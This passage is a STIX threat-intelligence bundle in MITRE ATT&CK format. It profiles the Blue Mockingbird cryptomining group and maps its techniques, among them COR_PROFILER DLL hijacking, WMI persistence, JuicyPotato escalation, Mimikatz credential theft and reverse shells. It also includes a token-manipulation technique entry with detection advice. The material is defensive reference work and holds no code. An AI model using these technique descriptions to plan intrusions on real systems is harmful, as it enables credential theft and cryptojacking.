{
    "type": "bundle",
    "id": "bundle--5bac575c-28d9-4492-befe-c035ef0310db",
    "spec_version": "2.0",
    "objects": [
        {
            "x-MISP-uuid": "",
            "x_MISP-description": "",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "intrusion-set",
            "name": "Blue Mockingbird",
            "x_mitre_version": "1.1",
            "modified": "2022-06-11T20:10:32.917Z",
            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
            "aliases": [
                "Blue Mockingbird"
            ],
            "id": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.(Citation: RedCanary Mockingbird May 2020)",
            "x_mitre_contributors": [
                "Tony Lambert, Red Canary"
            ],
            "created": "2020-05-26T20:09:39.139Z",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/groups/G0108",
                    "external_id": "G0108",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--0e7ce20c-1a4f-4361-a954-1d7a164baca1",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
            "modified": "2020-06-25T13:59:10.215Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-06-24T23:51:51.525Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--1a666dc1-d0b9-49ac-b05b-350cfca7fa61",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "modified": "2020-06-25T13:59:09.704Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.473Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--1b9b84cc-f9c7-48c5-8e23-ac00a7a4691a",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has collected hardware details for the victim's system, including CPU and memory information.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "modified": "2020-06-25T13:59:09.814Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T18:25:52.409Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--3f221ccc-1be7-4959-b239-6a3e027da1ae",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Windows Scheduled Tasks to establish persistence on local and remote hosts.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "modified": "2020-06-25T13:59:09.706Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.458Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4c26e6e8-8303-44ad-9e5d-452dff52858f",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used frp, ssf, and Venom to establish SOCKS proxy connections.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
            "modified": "2020-06-25T13:59:09.806Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.497Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--6d3d48ff-ea37-4626-8148-4111163e95e3",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used JuicyPotato to abuse the <code>SeImpersonate</code> token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
            "modified": "2020-06-25T13:59:09.926Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.535Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--06de29d8-365b-4072-a4bb-9d436763ea1e",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used PowerShell reverse TCP shells to issue interactive commands over a network connection.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "modified": "2020-06-25T13:59:09.716Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.498Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--8b3f4fd5-9acd-49e5-bae5-6996ae46aa0f",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Windows Registry modifications to specify a DLL payload.(Citation: RedCanary Mockingbird May 2020)\t",
            "target_ref": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
            "modified": "2020-06-25T13:59:09.809Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-06-08T19:45:34.975Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--8dc7e200-3c90-4611-9bbe-aa90056f423e",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.(Citation: RedCanary Mockingbird May 2020)\t",
            "target_ref": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
            "modified": "2020-06-25T13:59:09.612Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-26T20:09:39.224Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--47e9267e-e84d-43b6-992a-5f42d39c45bb",
            "description": "(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60",
            "modified": "2020-06-25T13:59:09.949Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T18:25:52.535Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--56af2eea-6c9d-4917-b7d9-275877cb552a",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Mimikatz to retrieve credentials from LSASS memory.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
            "modified": "2020-06-25T13:59:09.936Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.532Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--85aecc08-dda1-4203-9dec-376f1d9d3cad",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has obfuscated the wallet address in the payload binary.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "modified": "2020-06-25T13:59:10.046Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-06-08T19:55:47.563Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--328e9746-4bb6-47e1-8e71-6418ca04c5fa",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has made their XMRIG payloads persistent as a Windows Service.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "modified": "2020-06-25T13:59:09.943Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.539Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--8042dc21-37e4-4a60-aef1-457179f346e5",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used XMRIG to mine cryptocurrency on victim systems.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
            "modified": "2020-06-25T13:59:09.709Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.486Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--51548d6c-0aa9-4813-8493-3d9bbcd0617a",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used wmic.exe to set environment variables.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
            "modified": "2020-06-25T13:59:09.923Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-06-08T19:45:34.998Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--552215a4-9761-4dce-8a59-83cd81ca43a8",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used batch script files to automate execution and deployment of payloads.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "modified": "2020-06-25T13:59:09.803Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.471Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--66513679-0866-4091-a346-2679db5e3cca",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has executed custom-compiled XMRIG miner DLLs using rundll32.exe.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "modified": "2020-06-25T13:59:09.792Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-26T20:09:39.246Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--a4bb6f26-b659-4d1d-b0fc-f4f4efe32db6",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
            "modified": "2020-06-25T13:59:09.795Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-26T20:09:39.255Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--abd46534-2632-4c12-a9c2-06a2a4116f2c",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
            "modified": "2020-06-25T13:59:09.933Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.530Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--b04c89b2-f790-4961-a012-7ccd18d1436e",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.(Citation: RedCanary Mockingbird May 2020)\t",
            "target_ref": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
            "modified": "2020-06-25T13:59:09.699Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-26T20:09:39.243Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--bf4d368e-202d-4bd2-9ffe-013ca6104e05",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Windows Explorer to manually copy malicious files to remote hosts over SMB.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
            "modified": "2020-06-25T13:59:09.812Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.501Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--cc42a6c0-ce7c-442b-8ccc-cb5a9fba3462",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
            "modified": "2020-06-25T13:59:09.915Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-05-27T15:31:09.537Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--f06ee9db-1a29-412f-9584-5175eff85f28",
            "description": "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has obtained and used tools such as [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: RedCanary Mockingbird May 2020)",
            "target_ref": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
            "modified": "2021-10-12T21:46:13.229Z",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-10-12T21:46:13.229Z",
            "external_references": [
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Access Token Manipulation",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Process: Process Metadata",
                "Process: OS API Execution",
                "User Account: User Account Metadata",
                "Active Directory: Active Directory Object Modification",
                "Command: Command Execution"
            ],
            "x_mitre_version": "2.0",
            "modified": "2021-10-17T14:51:49.334Z",
            "created": "2017-12-14T16:46:06.044Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
            "x_mitre_defense_bypassed": [
                "Windows User Account Control",
                "System access controls",
                "File system access controls",
                "Heuristic Detection",
                "Host forensic analysis"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
            "x_mitre_effective_permissions": [
                "SYSTEM"
            ],
            "x_mitre_contributors": [
                "Tom Ueltschi @c_APT_ure",
                "Travis Smith, Tripwire",
                "Robby Winchester, @robwinchester3",
                "Jared Atkinson, @jaredcatkinson"
            ],
            "x_mitre_detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1134",
                    "external_id": "T1134",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/633.html",
                    "external_id": "CAPEC-633",
                    "source_name": "capec"
                },
                {
                    "source_name": "Pentestlab Token Manipulation",
                    "description": "netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",
                    "url": "https://pentestlab.blog/2017/04/03/token-manipulation/"
                },
                {
                    "source_name": "Microsoft Command-line Logging",
                    "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
                    "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing"
                },
                {
                    "source_name": "Microsoft LogonUser",
                    "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
                    "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx"
                },
                {
                    "source_name": "Microsoft DuplicateTokenEx",
                    "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
                    "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx"
                },
                {
                    "source_name": "Microsoft ImpersonateLoggedOnUser",
                    "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
                    "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx"
                },
                {
                    "source_name": "BlackHat Atkinson Winchester Token Manipulation",
